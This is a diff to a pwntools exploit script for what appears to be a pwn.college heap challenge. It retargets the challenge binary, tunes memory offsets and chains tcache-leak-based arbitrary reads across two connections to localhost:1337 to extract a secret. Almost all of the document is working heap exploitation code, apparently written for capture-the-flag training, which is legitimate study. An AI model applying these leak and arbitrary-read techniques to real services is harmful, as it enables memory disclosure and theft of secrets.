@@ -98,7 +98,7 @@ def arbitrary_read(r1, r2, addr, heap_base_addr):
 	
 	
 
-p = process('./babyprime_level3.0_patched')
+p = process('/challenge/babyprime_level3.0')
 r1 = remote("localhost", 1337)
 r2 = remote("localhost", 1337)
 leak = leak_tcache(r1, r2)
@@ -107,8 +107,9 @@ leak = leak_tcache(r1, r2)
 offset1 = 0x8a0 # from heap base 0x8a0 0xf20 0xd40	
 offset2 = 0x7ff640 # from second leak to base
 offset3 = 0x7fe8c0 # from base to last leak
-offset4 = 0x41a3c0 # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800
-
+offset4 = 0x41d3c0 # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800 0x41d3c0 0xe1d3c0 0x2913c0 0xc8d800 (pwncollege)
+offset45 = 0x4b450 # 0x4b430 0x4b450 0x4b500
+offset5 = 0x1040 # 0x171740 0x1040
 
 if leak:
 	print("tcache next pointer: ", hex(leak))
@@ -122,18 +123,26 @@ if leak:
 	
 	leak2 = arbitrary_read(r1, r2, (leak << 12) + offset1, leak)
 	print("second leak: ", hex(leak2))
-	
+
 	# Close and reopen connections to get fresh heap state
 	#r1.close()
 	#r2.close()
 	#r1 = remote("localhost", 1337)
 	#r2 = remote("localhost", 1337)
 	
-	secret_location = leak2 - offset4
-	print("Secret location: ", hex(secret_location))
-	#print(f"\nGDB: gdb -p {p.pid}")
-	#pause()
+	secret_location = leak2 + offset45
+	print("Secret location1: ", hex(secret_location))
+	print(f"\nGDB: gdb -p {p.pid}")
+	pause()
 	
+	leak3 = arbitrary_read(r1, r2, secret_location, leak + 1)
+
+	secret_location = leak3 - offset5
+	print("Secret location2: ", hex(secret_location))
+	print(f"\nGDB: gdb -p {p.pid}")
+	pause()
+
+
 	secret = arbitrary_read(r1, r2, secret_location, leak + 1)
 	secret = secret.to_bytes(8, 'little')
 	print(f"Secret string: {secret}")
@@ -145,7 +154,7 @@ if leak:
 	response = r1.recvall(timeout=2)
 	print(f"Server response: {response}")	
 else:
-	pause()
+	#pause()
 	print("Failed to leak")
 
 
